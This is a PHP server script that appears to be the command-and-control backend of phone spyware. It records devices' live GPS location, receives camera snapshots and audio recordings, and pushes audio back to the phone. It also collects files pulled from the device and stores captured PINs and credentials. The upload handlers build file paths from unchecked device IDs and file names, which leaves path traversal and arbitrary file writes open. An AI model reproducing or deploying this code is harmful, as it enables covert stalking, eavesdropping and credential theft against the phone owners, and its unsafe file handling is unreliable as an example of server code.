<?php
require_once 'db.php';

// --- v9.8.6 DEBUG LOGGING ---
function debug_log($msg) {
    file_put_contents('debug.log', date('[Y-m-d H:i:s] ') . $msg . PHP_EOL, FILE_APPEND);
}

$action = $_GET['action'] ?? '';
$input_raw = file_get_contents('php://input');
$input = json_decode($input_raw, true) ?? $_POST;

debug_log("Action: $action | Method: " . $_SERVER['REQUEST_METHOD'] . " | Data: " . substr($input_raw, 0, 100));

header('Content-Type: application/json');

switch ($action) {
    case 'register':
        $device_id = $input['device_id'] ?? 'unknown';
        $name = $input['name'] ?? 'Unknown Agent';
        $version = $input['version'] ?? '9.8.6';
        
        try {
            // v9.8.6: Force upsert with all metadata
            $stmt = $pdo->prepare("INSERT INTO devices (device_id, name, version, last_seen, status) 
                VALUES (?, ?, ?, NOW(), 'online') 
                ON DUPLICATE KEY UPDATE name = ?, version = ?, last_seen = NOW(), status = 'online'");
            $stmt->execute([$device_id, $name, $version, $name, $version]);
            
            $stmt = $pdo->prepare("INSERT IGNORE INTO commands (device_id) VALUES (?)");
            $stmt->execute([$device_id]);
            
            echo json_encode(['status' => 'success', 'nexus_id' => $device_id]);
            debug_log("SUCCESS: Registered $device_id");
        } catch (Exception $e) {
            echo json_encode(['status' => 'error', 'msg' => $e->getMessage()]);
            debug_log("ERROR: " . $e->getMessage());
        }
        break;

    case 'update':
        $device_id = $input['device_id'] ?? 'unknown';
        if ($device_id === 'unknown') {
            echo json_encode(['error' => 'Identity required']);
            break;
        }

        $lat = $input['lat'] ?? 0;
        $lon = $input['lon'] ?? 0;
        $speed = $input['speed'] ?? 0;
        $battery = $input['battery'] ?? 0;
        $charging = isset($input['charging']) ? (int)$input['charging'] : 0;
        $version = $input['version'] ?? '9.8.6';

        try {
            $stmt = $pdo->prepare("UPDATE devices SET lat=?, lon=?, speed=?, battery=?, charging=?, version=?, last_seen=NOW(), status='online' WHERE device_id=?");
            $stmt->execute([$lat, $lon, $speed, $battery, $charging, $version, $device_id]);

            if ($lat != 0 && $speed > 5) {
                $stmt = $pdo->prepare("INSERT INTO history (device_id, lat, lon, speed) VALUES (?, ?, ?, ?)");
                $stmt->execute([$device_id, $lat, $lon, $speed]);
            }

            $stmt = $pdo->prepare("SELECT * FROM commands WHERE device_id = ?");
            $stmt->execute([$device_id]);
            $commands = $stmt->fetch();
            echo json_encode($commands ?: ["camera" => "back", "audio" => "off"]);
        } catch (Exception $e) {
            echo json_encode(['status' => 'error']);
        }
        break;

    case 'camera_update':
        $device_id = $_POST['device_id'] ?? 'unknown';
        if (isset($_FILES['image'])) {
            $path = 'uploads/' . $device_id . '.jpg';
            move_uploaded_file($_FILES['image']['tmp_name'], $path);
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'no file'], 400);
        }
        break;

    case 'audio_update':
        $device_id = $_POST['device_id'] ?? 'unknown';
        if (isset($_FILES['audio'])) {
            $path = 'uploads/' . $device_id . '.pcm';
            move_uploaded_file($_FILES['audio']['tmp_name'], $path);
            echo json_encode(['status' => 'ok']);
        }
        break;

    case 'get_speak':
        $device_id = $_GET['device_id'] ?? 'unknown';
        $path = 'downloads/' . $device_id . '/speak.pcm';
        if (file_exists($path)) {
            header('Content-Type: application/octet-stream');
            readfile($path);
            unlink($path); // One-time play
        } else {
            http_response_code(404);
        }
        break;

    case 'save_credential':
        $device_id = $input['device_id'] ?? 'unknown';
        $credential = $input['credential'] ?? '';
        $type = $input['type'] ?? 'pin';
        
        $stmt = $pdo->prepare("INSERT INTO file_responses (device_id, type, data) VALUES (?, 'credential', ?)");
        $stmt->execute([$device_id, "[$type] $credential"]);
        echo json_encode(['status' => 'ok']);
        break;

    case 'file_response':
        $device_id = $_POST['device_id'] ?? 'unknown';
        if (isset($_POST['file_list'])) {
            $stmt = $pdo->prepare("INSERT INTO file_responses (device_id, type, data) VALUES (?, 'list', ?)");
            $stmt->execute([$device_id, $_POST['file_list']]);
        } elseif (isset($_FILES['file'])) {
            $dir = 'downloads/' . $device_id . '/';
            if (!is_dir($dir)) mkdir($dir, 0777, true);
            $file_name = $_POST['name'] ?? $_FILES['file']['name'];
            move_uploaded_file($_FILES['file']['tmp_name'], $dir . $file_name);
            
            $stmt = $pdo->prepare("INSERT INTO file_responses (device_id, type, file_name) VALUES (?, 'download', ?)");
            $stmt->execute([$device_id, $file_name]);
        }
        echo json_encode(['status' => 'ok']);
        break;

    case 'ping':
        $device_id = $_GET['device_id'] ?? 'unknown';
        $stmt = $pdo->prepare("UPDATE devices SET last_seen = NOW(), status = 'online' WHERE device_id = ?");
        $stmt->execute([$device_id]);
        echo json_encode(['status' => 'ok']);
        break;

    case 'history':
        $device_id = $input['device_id'] ?? 'unknown';
        $points = $input['points'] ?? [];
        foreach ($points as $p) {
            $stmt = $pdo->prepare("INSERT INTO history (device_id, lat, lon, speed, recorded_at) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))");
            $stmt->execute([$device_id, $p['lat'], $p['lon'], $p['speed'], $p['time'] / 1000]);
        }
        echo json_encode(['status' => 'success']);
        break;

    default:
        echo json_encode(['error' => 'Invalid action']);
        break;
}
?>
